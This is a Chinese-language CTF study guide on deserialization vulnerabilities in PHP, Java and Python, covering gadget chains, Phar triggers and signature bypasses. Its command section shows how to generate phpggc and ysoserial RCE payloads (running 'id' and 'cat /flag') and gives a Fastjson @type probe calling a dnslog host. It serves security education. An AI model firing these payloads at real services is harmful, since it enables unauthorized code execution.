# 反序列化

## 原理
反序列化漏洞的关键不是“对象被还原了”，而是应用把不可信字节流恢复为对象图后，在恢复、销毁、字符串转换、属性访问、模板渲染、动态分发或异常处理过程中触发了原本不该对攻击者开放的行为。PHP 常见于 `unserialize()` 及其 `__wakeup/__destruct/__toString/__call` 链；Java 常见于 `ObjectInputStream.readObject()`、Fastjson、Jackson、XStream、SnakeYAML 等类型恢复；Python 则常见于 `pickle.loads()`、`yaml.load()`、缓存、任务队列或会话恢复。真正的危险来自 gadget chain：单个类并不恶意，但对象图在框架生命周期中能串到文件写入、模板执行、命令执行、任意方法调用、SSRF 或 flag 读取。

CTF 题会把重点放在两类能力上：一类是识别入口与数据包装，另一类是拼装或利用 gadget。很多题表面只是一个 `base64(cookie)`、一段 session、一个“remember me” 参数、一个上传的 phar 文件，难点往往不是链子本身，而是先确认编码格式、签名/HMAC 规则、压缩层、是否加密、类名命名空间、目标语言与依赖版本。分析时应先从真实入口反推：数据由谁解析、在哪一步触发、运行时有哪些类已加载；然后再锁定危险魔术方法与可达 side effect，避免在庞大代码库里盲找“看起来危险”的函数。

## 工具与命令示例
```bash
# 1) 生成一个最简单的 PHP 序列化对象样本
php -r '$o=new stdClass();$o->a="test";echo serialize($o),PHP_EOL;'

# 2) 用 phpggc 枚举常见 PHP gadget 链
phpggc -l

# 3) 生成 PHP RCE/文件写入链，具体链取决于框架版本
phpggc monolog/rce1 system id

# 4) 生成 Java ysoserial 载荷
java -jar ysoserial.jar CommonsCollections6 "id"

# 5) 搜索源码中的危险入口与魔术方法
rg -n "unserialize\(|__wakeup|__destruct|__toString|readObject\(|pickle.loads|yaml.load\(" .

# 6) 用 Python 快速 base64 解码可疑 Cookie
python -c "import base64,sys;print(base64.b64decode(sys.argv[1]+'==='))" "Tzo0OiJUZXN0IjowOnt9"

# 7) 识别 Phar 元数据入口，常见于 file_exists/getimagesize 等文件函数
php -d phar.readonly=0 -r '$p=new Phar("test.phar");$p->startBuffering();$p->addFromString("a.txt","x");$p->setStub("GIF89a<?php __HALT_COMPILER(); ?>");$p->setMetadata(["k"=>"v"]);$p->stopBuffering();'

# 8) Python pickle 反汇编，适合判断是否存在危险 opcode
python -c "import pickletools,sys; pickletools.dis(open(sys.argv[1],'rb').read())" sample.pkl
```

## 常见 CTF 题型
### 题型一：PHP POP 链读 flag 或文件写入
思路：找到 `unserialize()` 入口后，从可控属性一路跟到 `__destruct`、`__toString`、`call_user_func`、模板渲染或文件函数。很多题并不要求完整 RCE，只要把 flag 文件读出来，或把内容写到 Web 可访问路径即可。

```php
<?php
class A {
    public $cmd;
}
$a = new A();
$a->cmd = 'phpinfo';
echo serialize($a), PHP_EOL;
```

### 题型二：Java 原生反序列化或依赖链
思路：识别目标是否用了 `readObject()`、RMI、JMX、HTTP 反序列化入口，确认依赖版本后套对应 ysoserial 链。CTF 里常把真实命令执行降级成“读取 `/flag` 文件”或回显某个环境变量，便于离线验证。

```bash
java -jar ysoserial.jar CommonsCollections6 "cat /flag" > payload.bin
base64 payload.bin
```

### 题型三：Fastjson/Jackson 类型注入
思路：用户可控 JSON 被目标框架按 `@type` 或多态类型字段恢复为任意类。先用 DNS/HTTP 外带验证是否能实例化特定类，再根据版本与黑名单选择 gadget 或本地 side effect。

```json
{
  "@type":"java.net.Inet4Address",
  "val":"xxxx.dnslog.example"
}
```

### 题型四：Python pickle / YAML 变体题
思路：题目给出的不一定是裸 `pickle`，也可能是签名后的 session、缓存 blob、Celery 任务、YAML 文档。先恢复原始字节流，再观察 `__reduce__`、全局引用与危险构造。

```python
import pickle
class X:
    def __reduce__(self):
        return (print, ('pickle-probe',))
print(pickle.dumps(X()))
```

## 绕过与进阶技巧
- **先拆包装层**：base64、gzip、URL 编码、JWT、HMAC、AES-CBC 包裹比 gadget 本身更常见；先恢复明文结构再谈利用。
- **白名单类环境**：若无法实例化任意类，尝试利用白名单对象的属性组合与魔术方法 side effect，而非一味追求经典 RCE 链。
- **Phar 触发面**：很多 PHP 题没有直接 `unserialize()`，但对用户可控路径调用 `file_exists`、`is_file`、`getimagesize`、`exif_read_data` 时会隐式解析 `phar://` 元数据。
- **版本强相关**：Java/PHP 框架 gadget 链高度依赖版本与已安装依赖；拿到链名后应验证目标运行时是否真的存在对应类。
- **签名绕过**：CTF 常把序列化数据加 HMAC，若存在弱密钥、固定密钥、密钥泄露、长度扩展式错误签名方案，就可能先过完整性再利用。
- **无命令执行也能得分**：文件读取、模板注入、路径覆盖、日志污染、SSRF、任意函数调用都可能足以拿 flag。
- **反序列化与二次利用**：上传的压缩包、图片、缓存、session 文件可能在后续任务中才被恢复，触发点与提交点往往分离。
- **源码阅读顺序**：优先搜真实入口，再搜魔术方法与危险 sink；不要反过来在全项目里盲找 `system()`。
- **跨语言误判**：有些题外层是 JSON，里层却包了 PHP/Java/Python 的序列化 blob；要根据实际编码和运行时证据判断。

## 快速检查清单
- [ ] 是否找到真实的反序列化入口，而非仅看到相似格式的数据
- [ ] 数据是否经过 base64、压缩、签名、加密等包装层处理
- [ ] 目标语言、框架、版本、已加载依赖是否已识别
- [ ] 是否存在 `__destruct/__wakeup/__toString/readObject/__reduce__` 等关键触发点
- [ ] 是否有文件函数、模板渲染、动态调用等可达 side effect
- [ ] 若无直接 `unserialize()`，是否测试过 `phar://` 等隐式触发面
- [ ] 完整性校验是否可伪造、可重放或存在弱密钥
- [ ] 题目目标是否只需文件读取/flag 回显，无需执着于通用 RCE
- [ ] 是否已用最小样本验证数据格式和触发时机
- [ ] gadget 选择是否基于真实运行时，而非只看网上通杀 payload
